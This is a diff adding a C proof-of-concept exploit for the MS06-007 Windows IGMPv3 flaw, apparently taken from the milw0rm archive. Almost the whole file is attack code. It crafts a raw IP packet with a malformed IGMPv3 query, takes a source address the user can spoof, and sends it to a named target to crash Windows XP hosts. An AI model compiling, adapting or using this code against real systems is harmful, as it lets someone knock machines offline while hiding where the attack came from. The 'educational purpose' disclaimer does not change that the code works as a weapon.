@@ -1,0 +1,162 @@
+/* MS06-007 Denial of Service POC exploit
+   created by Firestorm, based on zloSend.exe win32 exploit (http://www.securitylab.ru/poc/264136.php)
+   Tested on Windows XP SP2 as victim (compiled/runned on Fedore Core 4 x86)
+   FOR EDUCATIONAL PURPOSE ONLY !!!      */
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+
+struct iphdr
+{
+  unsigned char ihl:4, version:4, tos;
+  unsigned short tot_len, id, frag_off;
+  unsigned char ttl, protocol;
+  unsigned short check;
+  unsigned int saddr, daddr;
+  unsigned int options1;
+  unsigned int options2;
+};
+
+
+struct igmpv3_query {
+        unsigned char type;
+        unsigned char code;
+        unsigned short csum;
+        unsigned int group;
+        unsigned char qqic;
+        unsigned char qrv:3,
+        suppress:1,
+        resv:4;
+        unsigned short nsrcs;
+        unsigned int srcs[1];
+};
+
+
+unsigned short in_chksum(unsigned short *, int);
+long resolve(char *);
+
+
+long resolve(char *host)
+{
+  struct hostent *hst;
+  long addr;
+
+
+  hst = gethostbyname(host);
+  if (hst == NULL)
+    return(-1);
+
+
+  memcpy(&addr, hst->h_addr, hst->h_length);
+
+
+  return(addr);
+}
+
+
+int main(int argc, char *argv[])
+{
+  struct sockaddr_in dst;
+  struct iphdr *ip;
+  struct igmpv3_query *igmp;
+  long daddr, saddr;
+  int s, i=0, c, len, one=1;
+  char buf[1500];
+
+
+  if (argc < 3)
+  {
+    printf("MS06-007 Denial of Service POC exploit by Firestorm\n");
+    printf("Usage: %s <src> <dst>\n", *argv);
+    return(1);
+  }
+
+
+  daddr = resolve(argv[2]);
+  saddr = resolve(argv[1]);
+
+
+  memset(buf, 0, 1500);
+  ip = (struct iphdr *)&buf;
+  igmp = (struct igmpv3_query*)&buf[sizeof(struct iphdr)];
+
+
+  dst.sin_addr.s_addr = daddr;
+  dst.sin_family = AF_INET;
+
+
+  ip->ihl = 7;
+  ip->version = 4;
+  ip->tos = 0;
+  ip->tot_len = htons(44);
+  ip->id = htons(18277);
+  ip->frag_off=0;
+  ip->ttl = 128;
+  ip->protocol = IPPROTO_IGMP;
+  ip->check = in_chksum((unsigned short *)ip, sizeof(struct iphdr));
+  ip->saddr = saddr;
+  ip->daddr = daddr;
+  ip->options1 = 0;
+  ip->options2 = 0;
+  igmp->type = 0x11;
+  igmp->code = 5;
+  igmp->group=inet_addr("224.0.0.1");
+  igmp->qqic=0;
+  igmp->qrv=0;
+  igmp->suppress=0;
+  igmp->resv=0;
+  igmp->nsrcs=htons(1);
+  igmp->srcs[0]=daddr;
+
+  igmp->csum = 0; //For computing the checksum, the Checksum field is set to zero.
+  igmp->csum=in_chksum((unsigned short *)igmp, sizeof(struct igmpv3_query));
+
+  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  if (s == -1)
+    return(1);
+
+  printf("Sending IGMP packet: %s -> %s\n", argv[1], argv[2]);
+
+      if (sendto(s,&buf,44,0,(struct sockaddr *)&dst,sizeof(struct sockaddr_in)) == -1)
+      {
+        perror("Error sending packet");
+        exit(-1);
+      }
+
+  return(0);
+}
+
+
+unsigned short in_chksum(unsigned short *addr, int len)
+{
+   register int nleft = len;
+   register int sum = 0;
+   u_short answer = 0;
+
+   while (nleft > 1) {
+      sum += *addr++;
+      nleft -= 2;
+   }
+
+
+   if (nleft == 1) {
+      *(u_char *)(&answer) = *(u_char *)addr;
+      sum += answer;
+   }
+
+
+   sum = (sum >> 16) + (sum & 0xffff);
+   sum += (sum >> 16);
+   answer = ~sum;
+   return(answer);
+}
+
+// milw0rm.com [2006-03-22]
